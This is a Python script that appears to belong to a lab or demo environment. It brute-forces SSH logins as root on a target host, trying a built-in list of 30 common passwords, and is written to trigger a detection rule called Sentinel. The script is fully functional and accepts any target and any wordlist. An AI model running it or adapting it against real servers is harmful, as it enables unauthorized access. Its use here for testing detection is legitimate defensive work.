#!/usr/bin/env python3
"""
brute_force.py — SSH login brute force using paramiko.

Attempts 30 common passwords against the victim SSH server.
The victim uses a strong random password — all attempts fail by design.
The failed auth attempts trigger Sentinel's failed_conn rule.

Usage:
    python3 brute_force.py [--target 172.20.0.10] [--port 22]
"""
from __future__ import annotations

import argparse
import time
from typing import Sequence

import paramiko  # type: ignore[import]
from rich.console import Console
from rich.panel import Panel
from rich import box

console = Console()

_DEFAULT_WORDLIST: list[str] = [
    "password", "123456", "12345678", "admin", "root",
    "toor", "pass", "test", "1234", "qwerty",
    "abc123", "letmein", "monkey", "master", "dragon",
    "sunshine", "princess", "welcome", "shadow", "superman",
    "michael", "football", "baseball", "iloveyou", "trustno1",
    "batman", "access", "hello", "charlie", "donald",
]


def _attempt(host: str, port: int, username: str, password: str) -> bool:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            host, port=port, username=username, password=password,
            timeout=3, banner_timeout=5, auth_timeout=3,
        )
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return False
    finally:
        client.close()


def main() -> None:
    parser = argparse.ArgumentParser(description="SSH brute force")
    parser.add_argument("--target",   default="172.20.0.10")
    parser.add_argument("--port",     type=int, default=22)
    parser.add_argument("--wordlist", nargs="+", default=_DEFAULT_WORDLIST)
    args = parser.parse_args()

    total = len(args.wordlist)

    console.print(Panel(
        f"  [dim]Target:   [/dim]  [bold cyan]{args.target}:{args.port}[/bold cyan]\n"
        f"  [dim]Passwords:[/dim]  [white]{total} attempts[/white]  [dim](all will fail — victim uses strong password)[/dim]",
        title="[bold red]🔑  SSH BRUTE FORCE[/bold red]",
        border_style="red",
        box=box.DOUBLE,
        padding=(0, 1),
    ))

    console.print(f"\n  [bold][[STEP 1/1][/bold]  Attempting logins as [cyan]root[/cyan]...\n")

    successes = 0
    for i, password in enumerate(args.wordlist):
        step = f"{i + 1:>2}/{total}"
        success = _attempt(args.target, args.port, "root", password)
        if success:
            console.print(f"  [bold][[STEP {step}][/bold]  Trying [dim]\"{password}\"[/dim]  →  [bold green]✓ SUCCESS[/bold green]")
            successes += 1
            break
        else:
            console.print(f"  [bold][[STEP {step}][/bold]  Trying [dim]\"{password}\"[/dim]  →  [red]✗ Failed[/red]")
        time.sleep(1)

    console.print(
        f"\n  [bold green]✓  Done[/bold green]  │  {successes}/{total} successful  │  "
        f"{'[green]Access granted[/green]' if successes else '[dim]All attempts failed (expected)[/dim]'}\n",
    )


if __name__ == "__main__":
    main()
